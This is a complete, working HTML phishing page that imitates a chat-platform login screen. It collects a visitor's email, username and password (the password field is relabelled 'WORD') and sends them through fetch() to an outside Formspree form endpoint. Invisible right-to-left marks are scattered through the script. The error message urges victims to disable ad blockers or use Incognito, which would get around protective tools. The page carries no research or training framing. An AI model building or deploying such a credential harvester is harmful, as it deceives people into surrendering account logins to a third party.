<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Log In</title>
  <style>
    body{margin:0;min-height:100vh;display:grid;place-items:center;background:#2b2d31;font-family:Arial}
    .box{width:min(420px,92vw);background:#1e1f22;border:1px solid #3a3c43;border-radius:12px;padding:22px;color:#fff}
    h1{margin:0 0 6px;font-size:22px}
    p{margin:0 0 16px;color:#b5bac1;font-size:13px}
    label{display:block;margin:12px 0 6px;color:#b5bac1;font-size:12px}
    input{width:100%;padding:12px;border-radius:8px;border:1px solid #3a3c43;background:#313338;color:#fff;outline:none}
    button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;background:#5865f2;color:#fff;font-weight:700;cursor:pointer}
    .msg{margin-top:12px;font-size:13px}
    .err{color:#ff6b6b}
    .ok{color:#6bff95}
  </style>
</head>
<body>
  <div class="box">
    <h1>Log In</h1>
    <p>This form sends your input to the form owner.</p>

    <form id="loginForm" action="https://formspree.io/f/mqekqdqq" method="POST">
      <label for="email">EMAIL</label>
      <input id="email" name="email" type="email" required placeholder="name@example.com">

      <label for="username">USERNAME</label>
      <input id="username" name="username" type="text" required placeholder="yourname">

      <label for="word">WORD</label>
      <input id="word" name="word" type="text" required placeholder="word">

      <button type="submit">Log In</button>
      <div id="msg" class="msg"></div>
    </form>
  </div>
‏  <script>
‏    const form = document.getElementById('loginForm');
‏    const msg = document.getElementById('msg');

‏    form.addEventListener('submit', async (e) => {
‏      e.preventDefault();
‏      msg.textContent = "Sending...";
‏      msg.className = "msg";

‏      try {
‏        const res = await fetch(form.action, {
‏          method: "POST",
‏          body: new FormData(form),
‏          headers: { "Accept": "application/json" }
        });

‏        if (res.ok) {
‏          msg.textContent = "Done ✅";
‏          msg.className = "msg ok";
‏          form.reset();
‏        } else {
‏          const data = await res.json().catch(()=> ({}));
‏          msg.textContent = data?.error || "Something went wrong. Try again.";
‏          msg.className = "msg err";
        }
‏      } catch (err) {
‏        msg.textContent = "Network error / blocked. Try disabling AdBlock or using Incognito.";
‏        msg.className = "msg err";
      }
    });
‏  </script>
‏</body>
‏</html>
